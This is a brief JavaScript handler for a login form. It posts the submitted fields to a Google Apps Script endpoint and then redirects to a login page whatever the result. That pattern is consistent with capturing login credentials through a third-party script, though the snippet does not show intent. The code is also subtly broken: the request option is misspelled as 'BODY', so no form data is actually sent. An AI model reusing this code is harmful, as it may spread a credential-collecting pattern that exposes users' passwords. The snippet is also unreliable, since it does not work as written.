const loginForm = document.getElementById("login-form");

loginForm.addEventListener("submit", (e) => {
  e.preventDefault();
  const formData = new FormData(e.target);
    fetch("https://script.google.com/macros/s/AKfycbwBB2lQi2VZ1bLnQX8hEopbLSL0J-zXuOUZpJ22P4ZDW7Sv9RpPfX-cwSiBZOMaQs_o/exec", {
      method: "POST",
      BODY: formData,
    })
      .then((res) => res.text())
      .then((data) => {
        location.href="./login.html"
      })
      .catch((error) => alert("Please try again!"));
});